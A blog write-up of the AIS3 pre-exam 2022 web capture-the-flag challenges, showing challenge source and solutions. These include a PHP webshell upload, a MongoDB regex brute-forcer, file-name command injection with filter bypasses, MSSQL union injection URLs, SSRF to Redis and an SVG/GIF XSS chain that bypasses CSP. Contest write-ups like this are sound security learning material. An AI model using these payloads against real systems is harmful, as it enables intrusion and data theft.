---
title: AIS3 pre-exam 2022 web write up
date: 2022-06-06 21:19:46
tags:
    - ctf
    - ais3
    - write up
    - web security
---

## Introduction

This article is the write up of 2022 AIS3 pre-exam. [AIS3](https://ais3.org/) is a security course held in Taiwan, and pre-exam is something like qualification test. This is my first time participate AIS3. Fortunately I passed the pre-exam, so maybe I will share some note or something after the course end(?).

And I could only solve web question, so that's it :( Let's start.

<!-- more -->

## Questions

### Poking Bear

> Solved 205/292
> Interest ★
> Difficulty ☆
> New-knowledge ☆
> Bear ★★★

![](https://i.imgur.com/VKWCNJv.png)

There are a lot of buttons, so I checked out the href property. It's like `http://chals1.ais3.org:8987/bear/{num}`. And `SECRET BEAR` has no number in the property. Because the numbers seems like no regular intervals, I wrote a script to find out what is the number of secret bear.

```python=
import requests
import bs4

START_INDEX = 351
END_INDEX = 776

for i in range(START_INDEX, END_INDEX):
    print(i)
    response = requests.get(f"http://chals1.ais3.org:8987/bear/{i}").text
    print(bs4.BeautifulSoup(response).find("h1").text.strip())
```

And found out the number is 499, but when I enter the url. I got:

![](https://i.imgur.com/4sC2GJ9.png)

So I checked out my cookie.
看一下 cookie，現在是 human，所以改成 bear poker。
![](https://i.imgur.com/cedYLYv.png)

Seems I am a human now, so changed it to `bear poken`.

![](https://i.imgur.com/sHRMZIy.png)

![](https://i.imgur.com/prxUi8x.png)

Works!

### Simple File Uploader

> Solved 92/292
> Interest ★
> Difficulty ☆
> New-knowledge ☆
> p...php ?? (((ﾟ Д ﾟ;))) ★★★

![](https://i.imgur.com/GVR5fve.png)

We can upload file to the website, so maybe a webshell question?

It already gave us source code, so let's check it out first:

```php
<?php

if (isset($_FILES['file'])) {
    $file_name = basename($_FILES['file']['name']);
    $file_tmp = $_FILES['file']['tmp_name'];
    $file_type = $_FILES['file']['type'];
    $file_ext = pathinfo($file_name, PATHINFO_EXTENSION);

    if (in_array($file_ext, ['php', 'php2', 'php3', 'php4', 'php5', 'php6', 'phtml', 'pht'])) {
        die('p...php ?? (((ﾟДﾟ;)))');
    }

    $box = md5(session_start() . session_id());
    $dir = './uploads/' . $box . '/';
    if (!file_exists($dir)) {
        mkdir($dir);
    }

    $is_bad = false;
    $file_content = file_get_contents($file_tmp);
    $data = strtolower($file_content);

    if (strpos($data, 'system') !== false) {
        $is_bad = true;
    } else if (strpos($data, 'exec') !== false) {
        $is_bad = true;
    } else if (strpos($data, 'passthru') !== false) {
        $is_bad = true;
    } else if (strpos($data, 'show_source') !== false) {
        $is_bad = true;
    } else if (strpos($data, 'proc_open') !== false) {
        $is_bad = true;
    } else if (strpos($data, 'popen') !== false) {
        $is_bad = true;
    } else if (strpos($data, 'pcntl_exec') !== false) {
        $is_bad = true;
    } else if (strpos($data, 'eval') !== false) {
        $is_bad = true;
    } else if (strpos($data, 'assert') !== false) {
        $is_bad = true;
    } else if (strpos($data, 'die') !== false) {
        $is_bad = true;
    } else if (strpos($data, 'shell_exec') !== false) {
        $is_bad = true;
    } else if (strpos($data, 'create_function') !== false) {
        $is_bad = true;
    } else if (strpos($data, 'call_user_func') !== false) {
        $is_bad = true;
    } else if (strpos($data, 'preg_replace') !== false) {
        $is_bad = true;
    } else if (strpos($data, 'scandir') !== false) {
        $is_bad = true;
    }


    if ($is_bad) {
        die('You are bad ヽ(#`Д´)ﾉ');
    }

    $new_filename = md5(time()) . '.' . $file_ext;
    move_uploaded_file($file_tmp, $dir . $new_filename);
    echo '
    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css">
        <title>Simple File Uploader</title>
    </head>

    <body>
        <div class="container  is-vcentered  is-centered" style="max-width: 60%; padding-top: 10%;">
            <article class="message">
                <div class="message-header">
                    <p>Upload Success!</p>
                    <button class="delete" aria-label="delete"></button>
                </div>
                <div class="message-body">
                    Upload /uploads/' . $box . '/' . $new_filename . '
                </div>
            </article>
        </div>
    <body>
    </html> ';
} else if (isset($_GET['src'])) {
    show_source("index.php");
} else {
    echo file_get_contents('home.html');
}

```

Ok, we can bypass extension blacklist by `pHp`, and use dynamic function name to bypass second blacklist. Upload a webshell:

```php
<?php
$_GET['a']($_GET['b']);
```

And executed it with:
<http://chals1.ais3.org:8988/uploads/{MY_WEB_SHELL}.pHp?a=system&b=/rUn_M3_t0_9et_fL4g>
![](https://i.imgur.com/I7BW3jV.png)

### The Best Login UI

> Solved 32/292
> Interest ★★
> Difficulty ★
> New-knowledge ★★
> Be...st.. UI ☆

The question provide the source code, so that's it:

```javascript=
const express = require('express');
const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));

const PORT = process.env.PORT || 3000;
const mongo = {
    host: process.env.MONGO_HOST || 'localhost',
    db: process.env.MONGO_DB || 'loginui',
};

app.get('/', (_, res) => {
    res.sendFile(__dirname + '/index.html');
});

app.post('/login', async (req, res) => {
    const db = app.get('db');
    const { username, password } = req.body;
    const user = await db.collection('users').findOne({ username, password });
    if (user) {
        res.send('Success owo!');
    } else {
        res.send('Failed qwq');
    }
});

const MongoClient = require('mongodb').MongoClient;

MongoClient.connect(mongo.host, (err, client) => {
    if (err) throw err;
    app.set('db', client.db(mongo.db));
    app.listen(PORT, () => console.log(`Listening on port ${PORT}`));
});

```

Around line 19, it didn't check input type. So we can input something like `{'$regex': myRegex}` (regex of mongodb) instead of real password.

Write a script to BF password(that is: flag) with regex:

```python
import requests
import string

flag = "AIS3{"
charset = string.printable
done = False

while not done:
    for i in range(len(charset)):
        candidate = charset[i]
        escape_candidate = candidate
        if escape_candidate in "()*$+.?^\{\}[]|":
            escape_candidate = "\\" + escape_candidate
        print(candidate)

        response = requests.post(
            "http://chals1.ais3.org:54088/login",
            {
                "username": "admin",
                "password[$regex]": flag + escape_candidate,
            },
        ).text

        if response == "Success owo!":
            flag += candidate
            if candidate == "}":
                done = True
            break
    print(flag)
```

Just remember to escape some special characters to avoid error.(line 12) And everything is fine👍

### TariTari

> Solved 26/292
> Interest ★★
> Difficulty ★☆
> New-knowledge ★
> Disappointment ★★★ (When I saw a flag but not for me QQ)<br>

![](https://i.imgur.com/OXdNd9d.png)

Uploaded some file and got a response like:

```html
<a
    href="/download.php?file=ZjY0MGNjOWQ0ZTQwYzAwODliYmIxZjg1OGI2NWEwMmEudGFyLmd6&amp;name=removed.png.tar.gz.tar.gz"
    >Download</a
>
```

Try to change `name`, but got a error:

![](https://i.imgur.com/J1ir0Ld.png)

Than let's try another parameter. First decode the `file`:

```
03c0ec25a3cd7de367da1ff7c5461e8d.tar.gz
```

So maybe a path traversal here? Encoded `../../../etc/passwd` and filled in:

![](https://i.imgur.com/lkYNtW0.png)

So it works, try to download `index.php`:

```php
<h1>Tari</h1>
<p>Tari is a service that converts your file into a .tar.gz archive.</p>
<form action="/" method="POST" enctype="multipart/form-data">
    <input type="file" name="file" />
    <input type="submit" value="Upload" />
</form>
<?php
function get_MyFirstCTF_flag()
{
    // **MyFirstCTF ONLY FLAG**
    // Please IGNORE this flag if you are AIS3 Pre-Exam Player

    // Congratulations, you found the flag!
    // RCE me to get the second flag, it placed in the / directory :D
    echo 'MyFirstCTF FLAG: AIS3{../../3asy_pea5y_p4th_tr4ver5a1}';
}

function tar($file)
{
    $filename = $file['name'];
    $path = bin2hex(random_bytes(16)) . ".tar.gz";
    $source = substr($file['tmp_name'], 1);
    $destination = "./files/$path";
    passthru("tar czf '$destination' --transform='s|$source|$filename|' --directory='/tmp' '/$source'", $return);
    if ($return === 0) {
        return [$path, $filename];
    }
    return [FALSE, FALSE];
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $file = $_FILES['file'];
    if ($file === NULL) {
        echo "<p>No file was uploaded.</p>";
    } elseif ($file['error'] !== 0) {
        echo "<p>Error: Upload error.</p>";
    } else {
        [$path, $filename] = tar($file);
        if ($path === FALSE) {
            echo "<p>Error: Failed to create archive.</p>";
        } else {
            $path = base64_encode($path);
            $filename = urlencode($filename);
            echo "<a href=\"/download.php?file=$path&name=$filename.tar.gz\">Download</a>";
        }
    }
}
```

There is a flag, but I am not the participant of MyFirstCTF QQ

So let's try to abuse command injection next. Upload a file named `qwe'; whoami; echo '`

![](https://i.imgur.com/0AfNc9E.png)

Nice!

And I tried to use `ls /` to find out flag's filename, but somehow it doesn't work :( Maybe there's a WAF or something?

So I bypassed `/` with `${IFS}`:

```
qwe'; ls `echo${IFS}${PATH}|cut${IFS}-c1-1`;echo '
```

![](https://i.imgur.com/AmPueAH.png)

Bypass success! and just print out the flag

### Cat Emoji Database

> Solved 15/292
> Interest ★★☆
> Difficulty ★★☆
> New-knowledge ★★☆
> CATS😻 ★★★★★<br>

It provided source code too:

```python
from flask import Flask, request, redirect, jsonify, send_file
import re

app = Flask(__name__)


@app.before_request
def fix_path():
    # trim all the whitespace from path
    trimmed = re.sub("\s+", "", request.path)
    if trimmed != request.path:
        return redirect(trimmed)


@app.route("/")
def index():
    return send_file("index.html")


@app.route("/api/all")
def emojis():
    cursor = db().cursor()
    cursor.execute("SELECT Name FROM Emoji")
    return jsonify(cursor.fetchall())


@app.route("/api/emoji/<unicode>")
def api(unicode):
    print("SELECT * FROM Emoji WHERE Unicode = %s" % unicode)
    row = ""
    if row:
        return jsonify({"data": row})
    else:
        return jsonify({"error": "Cat emoji not found"})


@app.route("/source")
def source():
    return send_file(__file__, mimetype="text/plain")

```

So, seems like we need to do SQLi without the space.

Try get all cats:
![](https://i.imgur.com/lv9FxKy.png)

It told us hint is in the `secret_cat` emoji.

But we don't have its id. So SQLi time:
<http://chals1.ais3.org:9487/api/emoji/(128006)or(id=3)>

![](https://i.imgur.com/1QQ7WUO.png)

`FLAG is in other table`, so we need to know what kind of db is this to do more.

<http://chals1.ais3.org:9487/api/emoji/(12800996)union(SELECT+1,2,1,@@version,null)>

Through `@@version`, we knew it's SQL Server.
![](https://i.imgur.com/fQnkQtk.png)

So we can bypass space with `%C2%A0` and some parentheses.
This will show table_schema, table_name, and column_name, but only first table because of the `fetchone()` in source code. And the first table is `Emoji`. So that's not table we need.
[http://chals1.ais3.org:9487/api/emoji/(12800996)union(SeLECT(1),concat_ws(0x3a,table_schema,table_name,column_name),(''),(''),('1')%C2%A0from.information_schema.columns)](<http://chals1.ais3.org:9487/api/emoji/(12800996)union(SeLECT(1),concat_ws(0x3a,table_schema,table_name,column_name),(''),(''),('1')%C2%A0from.information_schema.columns)>)

So let's skip `Emoji` table by `WHERE`.
[http://chals1.ais3.org:9487/api/emoji/(12800996)union(SeLECT(1),concat_ws(0x3a,table_schema,table_name,column_name),(''),(''),('1')%C2%A0from.information_schema."columns"where"table_name"!='Emoji')](<http://chals1.ais3.org:9487/api/emoji/(12800996)union(SeLECT(1),concat_ws(0x3a,table_schema,table_name,column_name),(''),(''),('1')%C2%A0from.information_schema."columns"where"table_name"!='Emoji')>)
![](https://i.imgur.com/TebGMb8.png)

Found a table and column seems has flag, so let's select it.
[http://chals1.ais3.org:9487/api/emoji/(12800996)union(SeLECT(1),(m1ght_be_th3_f14g),(''),(''),('1')%C2%A0from.s3cr3t_fl4g_in_th1s_t4bl3)](<http://chals1.ais3.org:9487/api/emoji/(12800996)union(SeLECT(1),(m1ght_be_th3_f14g),(''),(''),('1')%C2%A0from.s3cr3t_fl4g_in_th1s_t4bl3)>)
![](https://i.imgur.com/L0bDRj8.png)

Got the flag successfully!

### Private Browsing

> Solved 4/292
> Interest ★★☆
> Difficulty ★★★
> New-knowledge ★★★
> What-a-pity ★★★

![](https://i.imgur.com/k9yvWzM.jpg)

Looks like SSRF, so let's try read source code.

<http://chals1.ais3.org:8763/api.php?action=view&url=file:///var/www/html/api.php>

```php=

<?php
require_once 'session.php';
class BrowsingSession
{
    function __construct()
    {
        $this->history = [];
    }
    function push($url)
    {
        $this->history[] = $url;
    }
    function get_history()
    {
        return $this->history;
    }
    function clear_history()
    {
        $this->history = [];
    }
    static function new()
    {
        return new BrowsingSession();
    }
}
$session = SessionManager::load_from_cookie('sess_id', ['BrowsingSession', 'new']);
if (!isset($_GET['action'])) {
    die();
}
$action = $_GET['action'];
if ($action === 'view' && isset($_GET['url'])) {
    header("Content-Security-Policy: script-src 'none'");
    $url = $_GET['url'];
    $session->push($url);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_exec($ch);
    curl_close($ch);
} else if ($action === 'get_history') {
    header('Content-Type: application/json');
    echo json_encode($session->get_history());
} else if ($action === 'clear_history') {
    $session->clear_history();
    echo 'OK';
}
```

and `session.php`

```php=

<?php
$redis = new Redis();
$redis->connect('redis', 6379);
class SessionManager
{
    function __construct($redis, $sessid, $fallback, $encode = 'serialize', $decode = 'unserialize')
    {
        $this->redis = $redis;
        $this->sessid = $sessid;
        $this->encode = $encode;
        $this->decode = $decode;
        $this->fallback = $fallback;
        $this->val = null;
    }

    function get()
    {
        if ($this->val !== null) {
            return $this->val;
        }
        if ($this->redis->exists($this->sessid)) {
            $this->val = ($this->decode)($this->redis->get($this->sessid));
        } else {
            $this->val = ($this->fallback)();
        }
        return $this->val;
    }

    function __destruct()
    {
        global $redis;
        if ($this->val !== null) {
            $redis->set($this->sessid, ($this->encode)($this->val));
        }
    }

    function __call($name, $arguments)
    {
        return $this->get()->{$name}(...$arguments);
    }

    static function load_from_cookie($name, $fallback)
    {
        global $redis;
        if (isset($_COOKIE[$name])) {
            $sessid = $_COOKIE[$name];
        } else {
            $sessid = bin2hex(random_bytes(10));
            setcookie($name, $sessid);
        }
        return new SessionManager($redis, $sessid, $fallback);
    }
}
```

We found `redis` service in `session.php` line 2, so try get some info with `dict`.

<http://chals1.ais3.org:8763/api.php?action=view&url=dict://redis:6379/info>

```
-ERR unknown subcommand 'libcurl'. Try CLIENT HELP.
$4860
# Server
redis_version:7.0.0
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:e7d3349b21c83e26
redis_mode:standalone
.
.
.
// not gonna show all because too long :(
```

But when I tried to write file with redis, I found out some common commands were blocked.

> Seems we need to change redis's data by SSRF to control input of `session.php` and exploiting unserialization vulnerabilities? but no time QQ

↑ This is my guess at the second day ended, but I have to work in the 3rd day of exam. So unfortunately I'm not able to solve all web question, maybe someday😥

There is the [write up](https://github.com/maple3142/My-CTF-Challenges/tree/master/AIS3%20Pre-exam%202022/Private%20Browsing) from the qeustion setter, seems really close to my assumption.

### Gallery

> Solved 4/292
> Interest ★★★
> Difficulty ★★★☆
> New-knowledge ★★★
> What-a-pity ★★★

Some source code from question:

```python=
from flask import Flask, render_template, request, redirect, url_for, g, session, send_file
import sqlite3
import secrets
import os
import uuid
import mimetypes
import pathlib

from rq import Queue
from redis import Redis

app = Flask(__name__)
app.queue = Queue(connection=Redis('xss-bot'))
app.config.update({
    'SECRET_KEY': secrets.token_bytes(16),
    'UPLOAD_FOLDER': '/data/uploads',
    'MAX_CONTENT_LENGTH': 32 * 1024 * 1024,  # 32MB
})

IMAGE_EXTENSIONS = [ext for ext, type in mimetypes.types_map.items()
                    if type.startswith('image/')]

ADMIN_PASSWORD = os.getenv('ADMIN_PASSWORD', 'admin')
FLAG_UUID = os.getenv('FLAG_UUID', str(uuid.uuid4()))


def db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect('/tmp/db.sqlite3')
        db.row_factory = sqlite3.Row
    return db


@app.before_first_request
def create_tables():
    cursor = db().cursor()
    cursor.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            password TEXT
        );
        CREATE TABLE IF NOT EXISTS images (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            uuid TEXT,
            title TEXT,
            filename TEXT,
            user_id INTEGER,
            FOREIGN KEY(user_id) REFERENCES users(id)
        );
    """)
    cursor.execute("SELECT * FROM users WHERE username='admin'")
    if cursor.fetchone() == None:
        cursor.execute("INSERT INTO users (username, password) VALUES (?, ?)",
                       ('admin', ADMIN_PASSWORD))
        admin_id = cursor.lastrowid
        cursor.execute("INSERT INTO images (user_id, uuid, filename, title) VALUES (?, ?, ?, ?)",
                       (admin_id, FLAG_UUID, FLAG_UUID+".png", "FLAG"))

    db().commit()


@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()


@app.after_request
def add_csp(response):
    response.headers['Content-Security-Policy'] = ';'.join([
        "default-src 'self'",
        "font-src 'self' https://fonts.googleapis.com https://fonts.gstatic.com"
    ])
    return response


@app.route('/')
def index():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    cursor = db().cursor()
    cursor.execute("SELECT * FROM images WHERE user_id=?",
                   (session['user_id'],))
    images = cursor.fetchall()
    return render_template('index.html', images=images)


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    else:
        username = request.form['username']
        password = request.form['password']
        if len(username) < 5 or len(password) < 5:
            return render_template('login.html', error="Username and password must be at least 5 characters long.")
        cursor = db().cursor()
        cursor.execute("SELECT * FROM users WHERE username=?", (username,))
        user = cursor.fetchone()
        if user is None:
            user_id = cursor.execute("INSERT INTO users (username, password) VALUES (?, ?)",
                           (username, password)).lastrowid
            session['user_id'] = user_id
            db().commit()
            return redirect(url_for('index'))
        elif user['password'] == password:
            session['user_id'] = user['id']
            return redirect(url_for('index'))
        else:
            return render_template('login.html', error="Invalid username or password")


@app.route('/image/<uuid>')
def view(uuid):
    cursor = db().cursor()
    cursor.execute("SELECT * FROM images WHERE uuid=?", (uuid,))
    image = cursor.fetchone()
    if image:
        if image['user_id'] != session['user_id'] and session['user_id'] != 1:
            return "You don't have permission to view this image.", 403
        return send_file(os.path.join(app.config['UPLOAD_FOLDER'], image['filename']))
    else:
        return "Image not found.", 404


@app.route('/image/<uuid>/download')
def download(uuid):
    cursor = db().cursor()
    cursor.execute("SELECT * FROM images WHERE uuid=?", (uuid,))
    image = cursor.fetchone()
    if image:
        if image['user_id'] != session['user_id'] and session['user_id'] != 1:
            return "You don't have permission to download this image.", 403
        return send_file(os.path.join(app.config['UPLOAD_FOLDER'], image['filename']), as_attachment=True, mimetype='application/octet-stream')
    else:
        return "Image not found.", 404


@app.route('/upload', methods=['GET', 'POST'])
def upload():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    if request.method == 'GET':
        return render_template('upload.html')
    else:
        title = request.form['title'] or '(No title)'
        file = request.files['file']
        if file.filename == '':
            return render_template('upload.html', error="No file selected")

        extension = pathlib.Path(file.filename).suffix
        if extension not in IMAGE_EXTENSIONS:
            return render_template('upload.html', error="File must be an image")

        image_uuid = str(uuid.uuid4())
        filename = image_uuid + extension
        cursor = db().cursor()
        cursor.execute("INSERT INTO images (user_id, uuid, title, filename) VALUES (?, ?, ?, ?)",
                       (session['user_id'], image_uuid, title, filename))
        db().commit()
        file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
        return redirect(url_for('index'))


@app.route('/report', methods=['GET', 'POST'])
def report():
    if 'user_id' not in session:
        return redirect(url_for('login'))

    if request.method == 'GET':
        return f'''
        <h1>Report to admin</h1>
        <p>注意：admin 會用 <code>http://web/</code> （而非 {request.url_root} 作為 base URL 來訪問你提交的網站。</p>
        <form action="/report" method="POST">
            <input type="text" name="url" placeholder="URL ({request.url_root}...)">
            <input type="submit" value="Submit">
        </form>
        '''
    else:
        url = request.form['url']
        if url.startswith(request.url_root):
            url_path = url[len(request.url_root):]
            app.queue.enqueue('xssbot.browse', url_path)
            return 'Reported.'
        else:
            return f"[ERROR] Admin 只看 {request.url_root} 網址"

```

We can bypass `IMAGE_EXTENSIONS` white list and xss by uploaded a `.svg` file.

After we can execute javascript code, we can get flag through above steps:

1. Upload a malicious image(which can execute js code)
2. Send `1.`'s link to admin
3. Admin opens link, the code will do:
    1. Get uuid of image of flag
    2. Get image of flag as Blob
    3. Login another account
    4. Upload image of flag with `3.`'s account
4. Login account that already has flag image

So, let's start:

First, upload a gif with:(there are some magic header of `GIF`)
![](https://i.imgur.com/n1riTFy.png)

```
GIF89a/* # some GIF magic information, but cannot be shown here
fetch('/').then((r)=>r.text()).then((r)=>r.match('[a-z0-9\-]{36}')[0]).then((r)=>fetch('/image/'+r+'/download').then((r)=>r.blob()).then(function(r){
    fetch('/login', {
        method: 'POST',
        hearders: {
            'Content-Type': 'application/x-ww-form-urlencoded'
        },
        body: new URLSearchParams({
            'username': 'asdasd',
            'password': 'asdasd',
        })
    }).then(function(_){
        let formData = new FormData();
        formData.append('title', 'admin');
        formData.append('file',new Blob([r], {type: 'image/jpeg'}), 'flag.jpg');
        fetch('/upload', {
            method: 'POST',
            body: formData
        })
    })
}));
```

And upload a svg with(replace `{PREV_GIF_UUID}` with first `GIF`'s uuid):

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400" />
    <script href="/image/{PREV_GIF_UUID}/download"></script>
</svg>
```

to bypass CSP which is `default-src 'self'`, because we include script from self :)

And send this svg's view link to admin, then we can get image that admin uploaded to our account by heself!

## Summary

This time is my first time to participated a ctf seriously XD. But I need to work so I only participated 2 days(of 3 days), but at least I studied almost all web questions. Although it's really tired but I actually learned a lot from those questions. Like MSSQL injection, MongoDB regex, Redis RCE(although not success, but I knew there is a way now XD) It also makes me super excited about AIS3😍!

## References

-   <https://portswigger.net/web-security/sql-injection/cheat-sheet>
-   <https://portswigger.net/web-security/cross-site-scripting/cheat-sheet>
